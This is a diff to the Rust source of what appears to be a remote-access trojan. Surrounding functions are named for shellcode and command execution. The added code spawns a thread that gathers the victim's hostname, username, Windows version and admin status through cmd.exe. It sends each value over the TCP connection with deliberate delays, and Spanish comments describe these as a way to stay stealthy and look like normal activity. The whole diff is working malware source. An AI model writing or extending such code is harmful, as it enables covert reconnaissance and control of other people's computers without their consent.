@@ -82,6 +82,23 @@ fn execute_shellcode() {
     }
 }
 
+fn get_system_info(info_type: &str) -> String {
+    let output = match info_type {
+        "hostname" => Command::new("hostname").output(),
+        "username" => Command::new("cmd").args(&["/C", "echo %USERNAME%"]).output(),
+        "os" => Command::new("cmd").args(&["/C", "ver"]).output(),
+        "privileges" => Command::new("cmd")
+            .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
+            .output(),
+        _ => return String::new(),
+    };
+
+    match output {
+        Ok(out) => String::from_utf8_lossy(&out.stdout).trim().to_string(),
+        Err(_) => "Unknown".to_string(),
+    }
+}
+
 fn execute_command(cmd: &str) -> String {
     // Manejar ping silenciosamente (keep-alive)
     if cmd == "ping" {
@@ -120,6 +137,16 @@ fn execute_command(cmd: &str) -> String {
     }
 }
 
+fn send_sysinfo(writer: &mut TcpStream, info_type: &str, tag: &str) -> Result<(), Box<dyn std::error::Error>> {
+    println!("DEBUG: Recopilando {}", info_type);
+    let info = get_system_info(info_type);
+    let message = format!("__SYSINFO__{}::{}{}", tag, info, DELIMITER);
+    writer.write_all(message.as_bytes())?;
+    writer.flush()?;
+    println!("DEBUG: Enviado {}: {}", info_type, info);
+    Ok(())
+}
+
 fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
     println!("DEBUG: Conexión establecida");
 
@@ -130,6 +157,24 @@ fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>
 
     let mut reader = BufReader::new(stream.try_clone()?);
     let mut writer = stream;
+
+    // Thread para recopilación sigilosa de información del sistema
+    let mut sysinfo_writer = writer.try_clone()?;
+    thread::spawn(move || {
+        // Esperar un poco después de conectar (parece actividad normal)
+        thread::sleep(Duration::from_secs(8));
+        let _ = send_sysinfo(&mut sysinfo_writer, "hostname", "HOSTNAME");
+        
+        // Esperar entre cada recopilación para ser sigiloso
+        thread::sleep(Duration::from_secs(12));
+        let _ = send_sysinfo(&mut sysinfo_writer, "username", "USERNAME");
+        
+        thread::sleep(Duration::from_secs(15));
+        let _ = send_sysinfo(&mut sysinfo_writer, "os", "OS");
+        
+        thread::sleep(Duration::from_secs(10));
+        let _ = send_sysinfo(&mut sysinfo_writer, "privileges", "PRIV");
+    });
 
     loop {
         let mut command = String::new();
